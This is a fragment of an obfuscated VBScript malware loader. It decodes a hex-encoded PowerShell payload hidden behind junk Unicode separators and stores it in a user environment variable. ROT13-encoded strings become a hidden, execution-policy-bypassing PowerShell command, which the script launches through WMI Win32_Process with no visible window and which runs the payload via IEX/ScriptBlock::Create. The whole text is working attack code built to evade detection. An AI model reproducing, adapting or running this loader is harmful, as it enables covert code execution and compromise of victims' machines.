"2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು0ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು0ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5 ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು2ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು5ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು5ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು5ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು0ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು6ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುFဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು0ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುEဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು0ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು5ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ುCဃ↌ᰪ̓ು2ဃ↌ᰪ̓ು9ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು1ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ು4ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು3ဃ↌ᰪ̓ು6ဃ↌ᰪ̓ು8ဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುBဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು7ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುDဃ↌ᰪ̓ು0ဃ↌ᰪ̓ುAဃ↌ᰪ̓ು"
procyonine = ""
cyrtolites = Split(CStr(overnumerous), "ဃ↌ᰪ̓ು")
For diplumbic = 0 To UBound(cyrtolites)
    procyonine = procyonine & cyrtolites(diplumbic)
Next

procyonine = Trim(procyonine)
authoriser = Chr(38) & Chr(72) 
hyperelasticity = ""

For nonsnack = 1 To Len(procyonine) Step 2
    hyperelasticity = hyperelasticity & Chr(CInt(authoriser & Mid(procyonine, nonsnack, 2)))
Next

Dim Kiwanian, movements, misrouted, Pawnees, archiva, synotia
Dim unawares, nonvitamin, cephalo, teleoscope

Kiwanian = Array( _
    "VAGREANY_QO_PNPUR", _
    "cbjrefuryy.rkr -RkrphgvbaCbyvpl Olcnff -AbCebsvyr -JvaqbjFglyr Uvqqra -Pbzznaq", _
    "VRK $rai:", _
    ";[Raivebazrag]::FrgRaivebazragInevnoyr" _
)

For synotia = 0 To UBound(Kiwanian)
    movements = Kiwanian(synotia)
    misrouted = ""
    For archiva = 1 To Len(movements)
        Pawnees = Asc(Mid(movements, archiva, 1))
        If (Pawnees >= 65 And Pawnees <= 77) Or (Pawnees >= 97 And Pawnees <= 109) Then
            misrouted = misrouted & Chr(Pawnees + 13)
        ElseIf (Pawnees >= 78 And Pawnees <= 90) Or (Pawnees >= 110 And Pawnees <= 122) Then
            misrouted = misrouted & Chr(Pawnees - 13)
        Else
            misrouted = misrouted & Mid(movements, archiva, 1)
        End If
    Next
    Kiwanian(synotia) = misrouted
Next

unawares    = Kiwanian(0)
nonvitamin     = Kiwanian(1)
cephalo     = Kiwanian(2)
teleoscope     = Kiwanian(3)

Dim dianetics, kerbstones, waylaying, Monterey, dilutionS, dilutionSt, dilutionP, thitto

Set dianetics = CreateObject("WScript.Shell")
Set kerbstones = dianetics.Environment("User")
kerbstones(unawares) = hyperelasticity

waylaying = Chr(38) & " ([ScXYTNripXYTNtBXYTNloXYTNck]::CXYTNrXYTNeate(${env:" & unawares & "}))"
waylaying = Replace(waylaying, "XYTN", "")
Monterey = nonvitamin & " """ & waylaying & """"

thitto = Array("77696e6d676d74733a726f6f745c63696d7632", "57696e33325f50726f6365737353746172747570", "57696e33325f50726f63657373")

For synotia = 0 To UBound(thitto)
    procyonine = thitto(synotia)
    misrouted = ""
    For nonsnack = 1 To Len(procyonine) Step 2
        misrouted = misrouted & Chr(CInt(authoriser & Mid(procyonine, nonsnack, 2)))
    Next
    thitto(synotia) = misrouted
Next

dilutionS  = thitto(0)
dilutionSt = thitto(1)
dilutionP  = thitto(2)

Dim unbolting, nongenetically, acaridae, contains

Set unbolting = GetObject(dilutionS)
Set nongenetically = unbolting.Get(dilutionSt).SpawnInstance_

nongenetically.ShowWindow = 0 

acaridae = unbolting.Get(dilutionP).Create(Monterey, Null, nongenetically, contains)

Set kerbstones = Nothing
Set dianetics = Nothing
Set unbolting = Nothing
Set nongenetically = Nothing

End Function
